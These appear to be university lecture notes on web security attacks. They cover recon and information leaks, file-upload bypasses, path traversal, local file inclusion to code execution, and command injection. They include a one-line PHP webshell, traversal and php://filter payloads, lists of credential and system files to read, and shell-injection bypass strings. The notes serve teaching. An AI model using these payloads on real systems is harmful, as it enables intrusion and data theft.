# 2022 Computer Security - WEB

## Recon & Info Leak

* 觀察建置環境 (Recon)
    * 網站架構 (Web Architecture)
    * 網站語言 (Web Language)
    * 網站框架 (Web Framework)
    * 網站伺服器 (Web Server)
    * 網站資料庫 (Web Database)
    * ...
* 尋找漏洞 (Fuzz)
    * 理解語言特性 / 框架原理
    * 網站邏輯
    * 已知框架 / 套件漏洞
* 實際攻擊 (Exploit)
    * 將漏洞轉為實體危害
    * 擴張漏洞的危害性

### Recon (Reconnaissances) / 偵查

* 網站指紋辨識
    * Special URL path
    * Error message
    * HTTP Response Header
    * Session ID
    * (And more)
* 自動化分析網站技術的 browser extension: [Wappalyzer](https://www.wappalyzer.com/)

### Information Leak / 資訊洩露

* 開發人員忘記關閉 debug mode 或錯誤訊息
* 不小心把不該公開的東西推到 production 上
* ...

#### 常見套路

* robots.txt
    * 告訴爬蟲什麼該看什麼不該看
    * 可能包含**不想被爬取**的路徑
        * e.g., 管理後台
* .git / .svn / .bzr
    * 常見的版本控制系統
    * 可還原 source code
    * Tools (for git)
        * denny0223/scrable/lijiejie/GitHack: GitHack is a tool to scan the .git directory of the target website, download the source code, and then search for sensitive information such as database configuration files, private keys, etc.
* .DS_Store
    * macOS 上自動產生的隱藏檔
    * 可得知資料夾內的文件名稱 / 路徑
    * lijiejie/ds_store_exp: .DS_Store file vulnerability scanner
* .index.php.swp
    * vim 暫存檔
    * 可以直接還原原本的 source
* Backup files
    * www.tar.gz
    * backup.zip
    * ...

#### Google Hacking

* site: nthu.edu.tw
* intext: "管理介面"
* filetype: sql
* Google Hacking Database (GHDB):
    * https://www.exploit-db.com/google-hacking-database

#### Other tricks

* Disearch / Gobuster
* Subdomain Enumeration
* Virtual domain enumeration

### Insecure Upload / Download

* Web 世界的世界觀
    * file-based
    * route-based

### Webshell

* Webshell - 在 Web Server 上執行任意指令的頁面 (shell on Web)

#### Prevent & Bypass
* 檢查 **POST Content Type**
* 檢查 **file signature** (magic number)
    * https://filesignatures.net/
    * e.g., 
        * GIF - 47 49 46 38 GIF8
        * PNG - 89 50 4E 47 .PNG
    * webshell: Magic Number + PHP Code - `GIF89a<?php system($_GET['cmd']); ?>`
* 檢查 **file extension (副檔名)**
    * 黑名單
    * 白名單
    * e.g., No .php?
        * pHP
        * pht, phtml, php[3, 4, 5, 7], ...
        * html, svg         // XSS
        * .htaccess (Apache2 Feature)
            > ```apache=
            > <FilesMatch "meow">
            >     SetHandler application/x-httpd-php
            > </FilesMatch>
            > ```
            * webshell.meow -> 會被當 php 執行

### Path Traversal

* Path Traversal - 路徑遍歷
    * 透過特殊的路徑來讀取不該讀取的檔案
    * e.g., `http://example.com/../../etc/passwd`
    * Nginx misconfiguration
        * `http://127.0.0.1/static../settings.py`
        > ```nginx=
        > location /static {
        >     alias /home/app/static/;
        > }
        > ```
        * `/home/app/static/../settings.py`

### Arbitrary File Read

* Arbitrary File Read - 讀取任意檔案
    * 後端原始碼、敏感資料 etc...
    * fopen()
    * file_get_contents()
    * readfile()
    * ...
* config files
    * `/etc/php/php.ini`
    * `/etc/apache2/apache2.conf`
    * `/etc/nginx/nginx.conf`
    * `/etc/apache2/sites-available/000-default.conf`
    * ...
* System information
    * User information
        * `/etc/passwd`
        * `/etc/shadow` (root only)
    * Process information
        * `/proc/self/environ`  (環境變數)
        * `/proc/self/cwd`      (symblolic link 到 cwd)
        * `/proc/self/cmdline`  (執行的指令)
        * `/proc/self/exe`      (執行的檔案)
        * `/proc/self/fd/[num]` (file descriptor)
        * `/proc/sched_debug`   (process scheduling)
* Network
    * `/etc/hosts`
    * `/proc/net/*`
        * `/proc/net/fib_trie`
        * `/proc/net/[tcp, udp]`
        * `/proc/net/route`
        * `/proc/net/arp`

### LFI - Local File Inclusion

* include 伺服器端人黨案
    * include()
    * require()
    * include_once()
    * require_once()
    * ...
* `/?module=phpinfo.php`
* `/?module=php://filter/convert.base64-encode/resource=phpinfo.php`

### LFI to RCE

* access.log / error.log 可讀
* /proc/self/environ 可讀
    * 把 payload 塞在 user-agent 裡面，然後 include 它
* 控制 session 內容
    * PHP session 內容預設是以**檔案儲存**
    * include **/tmp/sess_{session_name}**
    > LFI 可以讀取到 /tmp/sess_{session_name}，而且 session 內容是可以被控制的，因此可以把 payload 寫進去，然後 include 它，php 在讀取檔案的過程中會把 payload 當作指令執行，因此做到 RCE。
* session.upload_progress
    * session.upload_progress = on; # enabled by default
* phpinfo
    * https://insomniasec.com/downloads/publications/LFI+With+PHPInfo+Assistance.pdf
* PHP filter
    * https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
* One line php 從入門到入土
    * https://hackmd.io/@ginoah/phpInclude#/

## Injection

* Dangerous funciton
    * PHP
        * eval
        * assert
        * create_function // removed since PHP 8.0
    * Python
        * exec
        * eval
    * JavaScript
        * eval
        * (new Function(/* code */))()
        * setTimeout / setInterval
        * ...

### Command Injection
* Basic Tricks
    * ping 127.0.0.1 **;id**
        * ; -> 代表結束一個指令
    * ping 127.0.0.1 **|id**
        * A|B -> 代表 pipe A 的結果給 B
    * ping 127.0.0.1 **&&id**
        * A&&B -> 代表如果 A 成功，才執行 B
    * ping 127.0.0.1 **||id**
        * A||B -> 代表如果 A 失敗，才執行 B
* Space bypass
    * `cat<TAB>/flag`
    * `cat</flag`     - pipeable command
    * `{cat,/flag}`   - brace expansion
    * `cat$IFS/flag`  - IFS (Internal Field Separator)
    * `X=$'cat\x20/flag'&&$X`
* **Blacklsit** bypass
    * `cat /f'la'g` / `cat /f"la"g`
    * `cat /f\l\ag`
    * `cat /f*`
    * `cat /f?a?`
    * `cat ${HOME:0:1}etc${HOME:0:1}passwd`

### SQL Injection
* SQL Map
    * sqlmap.py

